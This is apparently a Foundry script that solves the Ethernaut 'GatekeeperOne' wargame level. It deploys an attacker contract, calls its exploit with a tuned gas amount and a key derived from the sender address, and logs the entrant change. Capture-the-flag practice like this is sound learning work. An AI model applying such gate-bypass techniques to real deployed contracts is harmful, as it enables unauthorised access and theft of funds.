// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "instances/13_gatekeeperone.sol";
import "contracts/13_gatekeeperone.sol";

contract AttackerGatekeeperOneScript is Script {
    GatekeeperOne gatekeeperOne = GatekeeperOne(vm.envAddress("INSTANCE"));

    function run() external {
        vm.startBroadcast();

        AttackerGatekeeperOne attackerGatekeeperOne = new AttackerGatekeeperOne();

        console.log("Current entrant :", gatekeeperOne.entrant());
        attackerGatekeeperOne.exploit(
            address(gatekeeperOne),
            24769,
            uint16(msg.sender)
        );
        console.log("New entrant :", gatekeeperOne.entrant());

        vm.stopBroadcast();
    }
}
